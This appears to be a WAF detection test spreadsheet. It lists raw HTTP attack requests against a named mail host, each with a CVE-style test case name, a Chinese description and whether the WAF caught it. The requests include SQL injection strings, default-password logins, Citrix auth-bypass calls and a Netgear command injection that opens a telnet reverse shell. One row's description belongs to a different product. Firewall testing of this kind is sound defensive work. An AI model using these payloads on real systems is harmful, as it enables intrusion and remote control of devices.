请求头信息,URL,标志,用例名称,用例描述,东莞现场WAF检测情况
 GET /images/icons_title.gif?qhaeshs=7069632921300107265 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069632921300107265-r-nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/9122-05-27 23:42:36 Firefox/3.6.3-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/images/icons_title.gif,7069632921300107265,网关设备Telesquare文件删除漏洞（CVE-2021-46424）,Telesquare Tlr-2005Ksh是韩国Telesquare公司的一款 Sk 电讯 Lte 路由器。Telesquare TLR-2005Ksh 1.0.0 版本存在安全漏洞，该漏洞源于任意文件删除。远程攻击者利用此漏洞可通过 DELETE 请求删除任何文件，甚至是系统内部文件。,检测
 POST /login.cgi?qhaeshs=7069632870486114305 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 25-r-nqhaeshs: 7069632870486114305-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/56.0.2924.87 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-nContent-Type: application/x-www-form-urlencoded-r-n-r-nuser=admin&password=admin,/login.cgi,7069632870486114305,网关设备Secnet安网的AC集中管理平台弱口令漏洞,广州安网通信技术有限公司(简称“安网通信”)是一家提供网络安全设备，网络通讯设备等网络产品和业务解决方案的服务商。AC(无线控制器)：Wireless Access Point Controller。AC 集中管理是 AC+AP 的覆盖 的管理平台。攻击者通过构造的请求，可使用默认密码登录成功。,未检测
 POST /WEB_VMS/LEVEL15/?qhaeshs=7069632772188405761 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 72-r-nqhaeshs: 7069632772188405761-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，*/*;q=0.8-r-nAccept-Language: zh-cn，zh;q=0.8，en-us;q=0.5，en;q=0.3-r-nAuthorization: Basic bWFuYWdlcjptYW5hZ2Vy-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-ncommand=sh sys-mode&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.,/WEB_VMS/LEVEL15/,7069632772188405761,网关设备锐捷网关弱口令漏洞,锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷旗下的RG-NBR存在弱口令漏洞，攻击者可利用该漏洞访问到后台。,未检测
 GET /view/Behavior/TYs0u9.txt?qhaeshs=7069632753897046017 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069632753897046017-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/view/Behavior/TYs0u9.txt,7069632753897046017,网关设备锐捷网关远程命令执行漏洞（toquery-objclass）,锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。其组件被发现存在前台RCE，攻击者通过此漏洞可远程执行任意系统命令。,检测
 GET //index.php/Site/listTpl/id/-1)%20OR%20ORD(MID((IFNULL(CAST(VERSION()%20AS%20CHAR)，0x20))，7，1))%3C1%20AND%20(1=1?qhaeshs=7069632657751015425 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069632657751015425-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,//index.php/Site/listTpl/id/-1)%20OR%20ORD(MID((IFNULL(CAST(VERSION()%20AS%20CHAR)，0x20))，7，1))%3C1%20AND%20(1=1,7069632657751015425,网关设备Netrun路由器SQL注入漏洞,NETRUN是网润科技旗下的路由器。,未检测
 GET //index.php/Site/listTpl/id/-1)%20OR%20ORD(MID((IFNULL(CAST(VERSION()%20AS%20CHAR)，0x20))，1，1))%3E1%20AND%20(1=1?qhaeshs=7069632657751015425 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069632657751015425-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,//index.php/Site/listTpl/id/-1)%20OR%20ORD(MID((IFNULL(CAST(VERSION()%20AS%20CHAR)，0x20))，1，1))%3E1%20AND%20(1=1,7069632657751015425,网关设备Netrun路由器SQL注入漏洞,NETRUN是网润科技旗下的路由器。,未检测
 GET //userAuth.egi?upwd=1111&uname=admin&qhaeshs=7069632657751015425 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069632657751015425-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,//userAuth.egi?upwd=1111&uname=admin,7069632657751015425,网关设备Netrun路由器SQL注入漏洞,NETRUN是网润科技旗下的路由器。,未检测
 POST /scgi-bin/platform.cgi?qhaeshs=7069632595205554177 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 208-r-nqhaeshs: 7069632595205554177-r-nCache-Control: max-age=0-r-nSec-Ch-Ua: "Chromium";v="97"， " Not;A Brand";v="99"-r-nSec-Ch-Ua-Mobile: ?0-r-nSec-Ch-Ua-Platform: "Windows"-r-nUpgrade-Insecure-Requests: 1-r-nOrigin: https://173.12.170.101-r-nContent-Type: application/x-www-form-urlencoded; charset=utf-8-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/97.0.4692.71 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nSec-Fetch-Site: same-origin-r-nSec-Fetch-Mode: navigate-r-nSec-Fetch-User: ?1-r-nSec-Fetch-Dest: document-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nthispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain'+AND+'5434'%3d'5434'+AND+'MwLj'%3d'MwLj&button.login.USERDBUsers.router_status=Login&Login.userAgent=MDpd,/scgi-bin/platform.cgi,7069632595205554177,网关设备Netgear SQL 注入漏洞（CVE-2022-29383）,NETGEAR FVS336G是美国网件（NETGEAR）公司的一款VPN（虚拟私人网络）防火墙路由器。NETGEAR ProSafe SSL VPN firmware FVS336Gv2 和FVS336Gv3版本存在安全漏洞，该漏洞源于cgi-bin/platform.cgi中的USERDBDomains.Domainname缺少过滤转义，攻击者利用该漏洞可进行SQL注入攻击。,未检测
 POST /scgi-bin/platform.cgi?qhaeshs=7069632595205554177 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 208-r-nqhaeshs: 7069632595205554177-r-nCache-Control: max-age=0-r-nSec-Ch-Ua: "Chromium";v="97"， " Not;A Brand";v="99"-r-nSec-Ch-Ua-Mobile: ?0-r-nSec-Ch-Ua-Platform: "Windows"-r-nUpgrade-Insecure-Requests: 1-r-nOrigin: https://173.12.170.101-r-nContent-Type: application/x-www-form-urlencoded; charset=utf-8-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/97.0.4692.71 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nSec-Fetch-Site: same-origin-r-nSec-Fetch-Mode: navigate-r-nSec-Fetch-User: ?1-r-nSec-Fetch-Dest: document-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nthispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain'+AND+'5434'%3d'5435'+AND+'MwLj'%3d'MwLj&button.login.USERDBUsers.router_status=Login&Login.userAgent=MDpd,/scgi-bin/platform.cgi,7069632595205554177,网关设备Netgear SQL 注入漏洞（CVE-2022-29383）,NETGEAR FVS336G是美国网件（NETGEAR）公司的一款VPN（虚拟私人网络）防火墙路由器。NETGEAR ProSafe SSL VPN firmware FVS336Gv2 和FVS336Gv3版本存在安全漏洞，该漏洞源于cgi-bin/platform.cgi中的USERDBDomains.Domainname缺少过滤转义，攻击者利用该漏洞可进行SQL注入攻击。,未检测
 POST /dnslookup.cgi?qhaeshs=7069632585999056897 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 240-r-nUser-Agent: python-requests/2.25.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nAuthorization: Basic Og==-r-nContent-Type: application/x-www-form-urlencoded-r-nqhaeshs: 7069632585999056897-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nlookup=Lookup&host_name=www.google.com%3b%20sh%20-c%20%27%28sleep%204095%7ctelnet%20172.16.107.9%204444%7cwhile%20%3a%20%3b%20do%20sh%20%26%26%20break%3b%20done%202%3e%261%7ctelnet%20172.16.107.9%204444%20%3e/dev/null%202%3e%261%20%26%29%27,/dnslookup.cgi,7069632585999056897,网关设备Netgear远程命令执行漏洞（CVE-2017-6334）,NETGEAR DGN2200是美国网件（NETGEAR）公司的一款无线路由器产品。使用10.0.0.50版本固件的NETGEAR DGN2200设备中的dnslookup.cgi文件存在安全漏洞。远程攻击者可利用该漏洞执行任意的OS命令。,未检测
 POST /src/application/firewall/editschedule.php?IG_timeID=rest&qhaeshs=7069632370176950273 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 26-r-nqhaeshs: 7069632370176950273-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML， like Gecko) Chrome/14.0.835.163 Safari/535.1-r-nContent-Type: application/x-www-form-urlencoded-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nIG_timeID=||echo "aestest",/src/application/firewall/editschedule.php?IG_timeID=rest,7069632370176950273,网关设备金山防火墙 editschedule远程代码执行漏洞（php-command）,金山防火墙基于专门设计的硬件平台，以金山安全实验室自行定制的安全操作系统KSOS为核心，高度集成了防火墙、ASICVPN、入侵检测、带宽管理、防拒绝服务网关、多媒体通信安全、认证授权、内容安全控制、ADSL/ISDN接入安全、高可用性配置能力等众多安全角色，提供高度安全、可信和健壮的安全解决方案，真正实现了单一设备对网络的全方位防护。金山防火墙editschedule组件导致的远程命令执行。,未检测
 GET /index.asp?qhaeshs=7069632344591695873 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069632344591695873-r-nUser-Agent: Opera/8.95.(Windows NT 6.2; lv-LV) Presto/2.9.174 Version/10.00-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/index.asp,7069632344591695873,网关设备Intelbras敏感信息泄露漏洞（CVE-2021-3017）,Apache Dubbo是美国阿帕奇（Apache）基金会的一款基于Java的轻量级RPC（远程过程调用）框架。该产品提供了基于接口的远程呼叫、容错和负载平衡以及自动服务注册和发现等功能。Apache Dubbo 2.6.9和2.7.9之前存在安全漏洞，该漏洞源于默认支持对提供者接口公开的任意方法的通用调用。,未检测
 POST /HNAP1?qhaeshs=7069632031667257345 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 466-r-nqhaeshs: 7069632031667257345-r-nSOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings-r-nContent-Type: text/plain-r-nUser-Agent: PostmanRuntime/7.26.8-r-nAccept: */*-r-nPostman-Token: 2bbe9f50-d99d-4989-ab65-1edfab4220ec-r-nAccept-Encoding: gzip， deflate， br-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n<?xml version="1.0" encoding="utf颅8"?>-r-n<soap:Envelope-r-nxmlns:xsi="http://www.w3.org/2001/XMLSchema颅instance"-r-nxmlns:xsd="http://www.w3.org/2001/XMLSchema"-r-nxmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"-r-nsoap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">-r-n  <soap:Body>-r-n    <SetDeviceSettings xmlns="http://purenetworks.com/HNAP1/">-r-n      <AdminPassword>testing123</AdminPassword>-r-n    </SetDeviceSettings>-r-n  </soap:Body>-r-n</soap:Envelope>,/HNAP1,7069632031667257345,网关设备Dlink dir655远程代码执行漏洞,友讯集团（D-Link），成立于1986年，1994年10月于台湾证券交易所挂牌上市，为台湾第一家上市的网络公司，以自创D-Link品牌行销全球，产品遍及100多个国家。旗下产品dir655被发现远程代码执行漏洞，攻击者可通过该漏洞远程执行代码。,未检测
 POST /HNAP1?qhaeshs=7069632031667257345 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 466-r-nqhaeshs: 7069632031667257345-r-nSOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings"-r-nContent-Type: text/plain-r-nUser-Agent: PostmanRuntime/7.26.8-r-nAccept: */*-r-nPostman-Token: f4d2a982-baff-4208-941c-686d7780fa59-r-nAccept-Encoding: gzip， deflate， br-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n<?xml version="1.0" encoding="utf颅8"?>-r-n<soap:Envelope-r-nxmlns:xsi="http://www.w3.org/2001/XMLSchema颅instance"-r-nxmlns:xsd="http://www.w3.org/2001/XMLSchema"-r-nxmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"-r-nsoap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">-r-n  <soap:Body>-r-n    <SetDeviceSettings xmlns="http://purenetworks.com/HNAP1/">-r-n      <AdminPassword>testing123</AdminPassword>-r-n    </SetDeviceSettings>-r-n  </soap:Body>-r-n</soap:Envelope>,/HNAP1,7069632031667257345,网关设备Dlink dir655远程代码执行漏洞,友讯集团（D-Link），成立于1986年，1994年10月于台湾证券交易所挂牌上市，为台湾第一家上市的网络公司，以自创D-Link品牌行销全球，产品遍及100多个国家。旗下产品dir655被发现远程代码执行漏洞，攻击者可通过该漏洞远程执行代码。,未检测
 POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1&qhaeshs=7069631961030983681 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 44-r-nqhaeshs: 7069631961030983681-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-NITRO-USER: PjdFbLCc-r-nX-NITRO-PASS: xyFoLmXD-r-nContent-Type: application/xml-r-nCookie: SESSID=e05ef44401e56e21bd505c7de8b063cd-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n<appfwprofile><login></login></appfwprofile>,/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1,7069631961030983681,网关设备Citrix-Netscaler越权访问漏洞（CVE-2020-8195）,Citrix Systems Citrix System SDWAN WAN-OP是美国思杰系统（Citrix Systems）公司的一款SD-WAN（虚拟软件定义的广域网）设备。Citrix Systems Citrix ADC、Citrix Gateway和Citrix SDWAN WAN-OP中存在路径遍历漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。以下产品及版本受到影响：Citrix ADC 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix Gateway 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix SDWAN WAN-OP 11.1.1a之前版本，11.0.3d之前版本，10.2.7之前版本。,检测
 GET /menu/neo?qhaeshs=7069631961030983681 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069631961030983681-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nCookie: SESSID=e05ef44401e56e21bd505c7de8b063cd-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/menu/neo,7069631961030983681,网关设备Citrix-Netscaler越权访问漏洞（CVE-2020-8195）,Citrix Systems Citrix System SDWAN WAN-OP是美国思杰系统（Citrix Systems）公司的一款SD-WAN（虚拟软件定义的广域网）设备。Citrix Systems Citrix ADC、Citrix Gateway和Citrix SDWAN WAN-OP中存在路径遍历漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。以下产品及版本受到影响：Citrix ADC 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix Gateway 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix SDWAN WAN-OP 11.1.1a之前版本，11.0.3d之前版本，10.2.7之前版本。,检测
 POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1&qhaeshs=7069631961030983681 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 44-r-nqhaeshs: 7069631961030983681-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/xml-r-nX-NITRO-USER: LCGSfX-r-nX-NITRO-PASS: fYiZon-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n<appfwprofile><login></login></appfwprofile>,/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1,7069631961030983681,网关设备Citrix-Netscaler越权访问漏洞（CVE-2020-8195）,Citrix Systems Citrix System SDWAN WAN-OP是美国思杰系统（Citrix Systems）公司的一款SD-WAN（虚拟软件定义的广域网）设备。Citrix Systems Citrix ADC、Citrix Gateway和Citrix SDWAN WAN-OP中存在路径遍历漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。以下产品及版本受到影响：Citrix ADC 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix Gateway 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix SDWAN WAN-OP 11.1.1a之前版本，11.0.3d之前版本，10.2.7之前版本。,检测
 GET /menu/neo?qhaeshs=7069631933516349441 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069631933516349441-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nCookie: SESSID=e378c9af0555efa6115f172be31e2048-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/menu/neo,7069631933516349441,网关设备Citrix-Netscaler越权访问漏洞（CVE-2020-8193）,Citrix Systems Citrix System SDWAN WAN-OP是美国思杰系统（Citrix Systems）公司的一款SD-WAN（虚拟软件定义的广域网）设备。Citrix Systems Citrix ADC、Citrix Gateway和Citrix SDWAN WAN-OP中存在授权问题漏洞。攻击者可利用该漏洞未经身份验证访问某些URL端点。以下产品及版本受到影响：Citrix Systems Citrix ADC 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix Gateway 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix SDWAN WAN-OP 11.1.1a之前版本，11.0.3d之前版本，10.2.7之前版本。,检测
 POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1&qhaeshs=7069631933516349441 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 44-r-nqhaeshs: 7069631933516349441-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/xml-r-nX-NITRO-USER: LCGSfX-r-nX-NITRO-PASS: fYiZon-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n<appfwprofile><login></login></appfwprofile>,/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1,7069631933516349441,网关设备Citrix-Netscaler越权访问漏洞（CVE-2020-8193）,Citrix Systems Citrix System SDWAN WAN-OP是美国思杰系统（Citrix Systems）公司的一款SD-WAN（虚拟软件定义的广域网）设备。Citrix Systems Citrix ADC、Citrix Gateway和Citrix SDWAN WAN-OP中存在授权问题漏洞。攻击者可利用该漏洞未经身份验证访问某些URL端点。以下产品及版本受到影响：Citrix Systems Citrix ADC 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix Gateway 13.0-58.30之前版本，12.1-57.18之前版本，12.0-63.21之前版本，11.1-64.14之前版本，10.5-70.18之前版本；Citrix SDWAN WAN-OP 11.1.1a之前版本，11.0.3d之前版本，10.2.7之前版本。,检测
 POST /ws/v1/cluster/apps/new-application?qhaeshs=7069631807867584513 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 0-r-nqhaeshs: 7069631807867584513-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nUser-Agent: python-requests/2.22.0-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/ws/v1/cluster/apps/new-application,7069631807867584513,存储系统Hadoop YARN ResourceManager越权访问漏洞,Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么就可利用其进行远程命令执行。,检测
 PUT /aestest/_design/vul?qhaeshs=7069631718935756801 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 70-r-nqhaeshs: 7069631718935756801-r-nAuthorization: Basic QUVTOkFFUzEyMw==-r-nUser-Agent: curl/7.67.0-r-nAccept: */*-r-nContent-Type: application/json-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/aestest/_design/vul,7069631718935756801,存储系统Couchdb远程命令执行漏洞（CVE-2017-12636）,Apache CouchDB是美国阿帕奇（Apache）软件基金会的一个免费、开源、面向文档的数据库，是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。Apache CouchDB 1.7.0之前的版本和2.1.1之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意的shell命令（包括：从公共网络上下载和执行脚本）。,未检测
 POST /kylin/api/cubes/kylin_streaming_cube/learn_kylin/migrate?qhaeshs=7069631673234620416 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 0-r-nqhaeshs: 7069631673234620416-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nCookie: JSESSIONID=26056BFFE51990019E6302F790A23171-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/kylin/api/cubes/kylin_streaming_cube/learn_kylin/migrate,7069631673234620416,存储系统Apache-Kylin远程命令执行漏洞（CVE-2020-1956）,Apache Kylin是美国阿帕奇（Apache）软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供Hadoop/Spark之上的SQL查询接口及多维分析（OLAP）等功能。Apache Kylin中的静态API存在操作系统命令注入漏洞。攻击者可借助特制输入利用该漏洞在系统上执行任意OS命令。以下产品及版本受到影响：Apache Kylin 2.3.0版本至2.3.2版本，2.4.0版本至2.4.1版本，2.5.0版本至2.5.2版本，2.6.0版本至2.6.5版本，3.0.0-alpha版本，3.0.0-alpha2版本，3.0.0-beta版本，3.0.0版本，3.0.1版本。,检测
